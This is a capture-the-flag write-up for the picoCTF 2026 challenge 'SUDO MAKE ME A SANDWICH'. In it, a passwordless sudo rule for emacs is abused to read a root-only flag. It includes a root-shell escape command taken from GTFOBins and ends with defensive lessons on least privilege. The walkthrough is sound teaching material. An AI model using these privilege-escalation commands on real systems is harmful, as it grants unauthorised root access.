# SUDO MAKE ME A SANDWICH

- **Platform:** picoCTF
- **Event:** picoCTF 2026
- **Category:** General Skills
- **Difficulty:** Easy
- **Author:** Darkraicg492

## 1. Challenge Overview

> *"Can you read the flag? I think you can!"*
> *`ssh -p 14095 ctf-player@xebec.cylabacademy.net`*

**Objective:** Log in over SSH as the low-privileged `ctf-player` user and read `flag.txt`, which is owned by `root` and not readable by us.

The title is a reference to the classic [xkcd #149](https://xkcd.com/149/) ("Make me a sandwich" / "Sudo make me a sandwich"). It hints that `sudo` is the key.

## 2. Step-by-Step Solution

### Step 1: Logging In & Looking Around

```bash
ssh -p 14095 ctf-player@xebec.cylabacademy.net
```

Once connected, we list the home directory and try to read the flag:

```text
ctf-player@challenge:~$ ls
flag.txt
ctf-player@challenge:~$ cat flag.txt
cat: flag.txt: Permission denied
```

Checking the permissions explains why:

```text
ctf-player@challenge:~$ ls -la
...
-r--r----- 1 root       root         31 Sep 23 07:01 flag.txt
```

* **Key Observation:** `flag.txt` is owned by `root:root` with mode `0440`. Only `root` and members of the `root` group can read it, and `ctf-player` is neither.

### Step 2: Checking `sudo` Privileges

The first attempt, `sudo -la`, fails because `-l` and `-a` get parsed together and `-a` expects an argument. The correct command is simply `sudo -l`:

```text
ctf-player@challenge:~$ sudo -l
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
```

* **Key Observation:** `ctf-player` can run `/bin/emacs` as **any user** (`ALL`), including root, **without a password** (`NOPASSWD`). Emacs is a full text editor and can also run shell commands, so this is effectively root access.

### Step 3: Opening the Flag with Emacs as Root

We don't even need a shell. We can launch Emacs as root and have it open `flag.txt` directly. The `-nw` flag keeps Emacs in the terminal instead of trying to open a GUI window (there is no display over SSH):

```bash
sudo /bin/emacs -nw flag.txt
```

Because Emacs is running as root, it can read the file, and the flag is shown in the buffer:

```text
academy{REDACTED}
```

To leave Emacs, press `Ctrl+X` then `Ctrl+C`.

## 3. Flag

```text
academy{REDACTED}
```

## 4. Alternative Tools & Methods

### Alternative 1: Read the File Non-Interactively
Emacs batch mode can print the file contents straight to the terminal, with no editor UI to exit:

```bash
sudo /bin/emacs --batch --eval '(princ (with-temp-buffer (insert-file-contents "flag.txt") (buffer-string)))'
```

Note that `flag.txt` should be given as an absolute path (e.g. `/home/ctf-player/flag.txt`) if you run this from a different working directory.

### Alternative 2: Spawn a Root Shell (GTFOBins)
The [GTFOBins entry for `emacs`](https://gtfobins.github.io/gtfobins/emacs/) lists a sudo escape that gives a full root shell:

```bash
sudo /bin/emacs -Q -nw --eval '(term "/bin/sh")'
# whoami
# root
# cat /home/ctf-player/flag.txt
```

### Alternative 3: Shell Command Inside Emacs
After starting `sudo /bin/emacs -nw`, press `Alt+X` (or `Esc` then `x`), type `shell`, and press Enter. This opens a shell buffer running as root. You can also use `Alt+!` to run a single shell command such as `cat flag.txt`.

## 5. Key Takeaways & Security Lessons

1. **Always run `sudo -l` first:** It is one of the first commands to run after getting a shell on a Linux box. It shows exactly which commands you can run with elevated privileges.
2. **Misconfigured `sudo` rules lead to privilege escalation:** Giving a user passwordless `sudo` on a program that can read files, write files or spawn shells (`emacs`, `vim`, `less`, `find`, `awk`, `python`, and others) is the same as giving them root.
3. **Check GTFOBins:** [GTFOBins](https://gtfobins.github.io/) catalogues Unix binaries that can be abused to bypass restrictions when they are allowed through `sudo`, SUID bits or capabilities.
4. **Least privilege:** If a user only needs to do one specific task, allow a narrow wrapper script or a `sudoedit`-style rule limited to specific files. Don't allow a general-purpose program that can do anything.
